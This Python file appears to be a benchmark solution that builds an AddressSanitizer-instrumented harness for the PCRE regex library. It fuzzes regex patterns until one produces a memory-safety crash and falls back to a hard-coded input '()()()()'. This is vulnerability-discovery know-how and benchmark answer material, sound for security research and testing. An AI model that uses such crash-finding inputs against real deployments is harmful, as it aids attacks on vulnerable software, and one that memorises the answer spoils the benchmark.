import os
import tarfile
import tempfile
import subprocess
import random
import shutil


class Solution:
    def solve(self, src_path: str) -> bytes:
        tmpdir = tempfile.mkdtemp(prefix="poc_gen_")
        try:
            # Extract tarball
            try:
                with tarfile.open(src_path, "r:*") as tf:
                    tf.extractall(tmpdir)
            except Exception:
                return self._fallback_poc()

            root = self._find_root(tmpdir)
            try:
                exe_path = self._build_harness(root)
            except Exception:
                exe_path = None

            if exe_path:
                try:
                    pattern = self._find_crashing_pattern(exe_path)
                    if pattern:
                        return pattern.encode("ascii", "ignore")
                except Exception:
                    pass

            return self._fallback_poc()
        finally:
            shutil.rmtree(tmpdir, ignore_errors=True)

    def _find_root(self, tmpdir: str) -> str:
        entries = [os.path.join(tmpdir, name) for name in os.listdir(tmpdir)]
        dirs = [p for p in entries if os.path.isdir(p)]
        if len(dirs) == 1:
            return dirs[0]
        return tmpdir

    def _build_harness(self, root: str) -> str | None:
        # Collect PCRE library source files (pcre*.c), excluding tools with main()
        lib_sources: list[str] = []
        for dirpath, _, filenames in os.walk(root):
            for fn in filenames:
                if not fn.endswith(".c"):
                    continue
                if not fn.startswith("pcre"):
                    continue
                base = fn
                if base in ("pcretest.c", "pcredemo.c", "dftables.c", "pcregrep.c"):
                    continue
                full = os.path.join(dirpath, fn)
                rel = os.path.relpath(full, root)
                lib_sources.append(rel)

        if not lib_sources:
            return None

        # Write harness source
        harness_code = r'''
#include <stdio.h>
#include <string.h>
#include "pcre.h"

int main(int argc, char **argv) {
    if (argc < 2) {
        return 0;
    }
    const char *pattern = argv[1];
    const char *error = NULL;
    int erroffset = 0;
    pcre *re = pcre_compile(pattern, 0, &error, &erroffset, NULL);
    if (!re) {
        /* Invalid pattern, just exit normally. */
        return 0;
    }

    const char *subject = "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa";
    int ovector[256];

    int rc = pcre_exec(re,
                       NULL,
                       subject,
                       (int)strlen(subject),
                       0,
                       0,
                       ovector,
                       (int)(sizeof(ovector) / sizeof(ovector[0])));

    pcre_free(re);
    return rc;
}
'''
        harness_path = os.path.join(root, "poc_runner.c")
        with open(harness_path, "w", encoding="utf-8") as f:
            f.write(harness_code)

        sources = lib_sources + ["poc_runner.c"]

        env = os.environ.copy()
        env.setdefault("ASAN_OPTIONS", "abort_on_error=1:detect_leaks=0")

        base_cmd = [
            "gcc",
            "-std=c99",
            "-fsanitize=address",
            "-fno-omit-frame-pointer",
            "-g",
            "-O1",
            "-I.",
            "-Isrc",
            "-Wall",
            "-Wno-unused-result",
            "-o",
            "poc_runner",
        ] + sources + ["-lm"]

        # First try without config.h (no HAVE_CONFIG_H)
        try:
            subprocess.run(
                base_cmd,
                cwd=root,
                env=env,
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL,
                check=True,
                timeout=120,
            )
            return os.path.join(root, "poc_runner")
        except Exception:
            pass

        # If that fails, try running ./configure to generate config.h and compile with HAVE_CONFIG_H
        configure_path = os.path.join(root, "configure")
        if os.path.exists(configure_path):
            try:
                subprocess.run(
                    ["chmod", "+x", configure_path],
                    cwd=root,
                    check=False,
                    stdout=subprocess.DEVNULL,
                    stderr=subprocess.DEVNULL,
                    timeout=10,
                )
                subprocess.run(
                    ["./configure"],
                    cwd=root,
                    env=env,
                    stdout=subprocess.DEVNULL,
                    stderr=subprocess.DEVNULL,
                    check=True,
                    timeout=180,
                )
            except Exception:
                return None

            cmd_with_config = base_cmd.copy()
            # Insert -DHAVE_CONFIG_H after compiler
            cmd_with_config.insert(1, "-DHAVE_CONFIG_H")

            try:
                subprocess.run(
                    cmd_with_config,
                    cwd=root,
                    env=env,
                    stdout=subprocess.DEVNULL,
                    stderr=subprocess.DEVNULL,
                    check=True,
                    timeout=180,
                )
                return os.path.join(root, "poc_runner")
            except Exception:
                return None

        return None

    def _find_crashing_pattern(self, exe_path: str) -> str | None:
        exec_dir = os.path.dirname(exe_path)
        env = os.environ.copy()
        env.setdefault("ASAN_OPTIONS", "abort_on_error=1:detect_leaks=0")

        random.seed(0)

        basic_patterns = [
            "a",
            "aa",
            "(a)",
            "(aa)",
            "(a)(a)",
            "((a))",
            "(a|a)",
            "(a|aa)",
            "(aa|a)",
            "(a*)",
            "(a+)",
            "(a?)",
            "(a*)(a*)",
            "(a+)(a+)",
            "((a*)+)",
            "((a+)+)",
            "((a+)+)+",
            "(a(a)a)",
            "(a(a|a)a)",
            "((a)|(a))",
            "((a)|(aa))",
            "(a|a)(a|a)",
            "((a*)|(a+))",
            "(a(a*)(a*))",
        ]

        for pat in basic_patterns:
            if self._pattern_triggers_asan(exe_path, exec_dir, pat, env):
                return pat

        max_attempts = 1000
        seen: set[str] = set()
        for _ in range(max_attempts):
            pat = self._random_pattern()
            if pat in seen:
                continue
            seen.add(pat)
            if self._pattern_triggers_asan(exe_path, exec_dir, pat, env):
                return pat

        return None

    def _pattern_triggers_asan(
        self, exe_path: str, exec_dir: str, pattern: str, env: dict
    ) -> bool:
        try:
            proc = subprocess.run(
                [exe_path, pattern],
                cwd=exec_dir,
                env=env,
                stdin=subprocess.DEVNULL,
                stdout=subprocess.DEVNULL,
                stderr=subprocess.PIPE,
                timeout=5,
            )
        except subprocess.TimeoutExpired:
            return False
        stderr = proc.stderr or b""
        return b"AddressSanitizer" in stderr or b"ERROR: AddressSanitizer" in stderr

    def _random_pattern(self) -> str:
        def random_group() -> str:
            parts = []
            n_parts = random.randint(1, 3)
            for _ in range(n_parts):
                base = random.choice(["a", ".", "aa"])
                quant = random.choice(["", "?", "*", "+"])
                parts.append(base + quant)
            return "(" + "".join(parts) + ")"

        group_count = random.randint(1, 4)
        groups = [random_group() for _ in range(group_count)]
        pattern = groups[0]
        for g in groups[1:]:
            if random.random() < 0.4:
                pattern += "|" + g
            else:
                pattern += g
        if random.random() < 0.3 and len(pattern) < 40:
            pattern = "(" + pattern + ")"
        return pattern

    def _fallback_poc(self) -> bytes:
        # Simple 8-byte regex with multiple capturing groups
        return b"()()()()"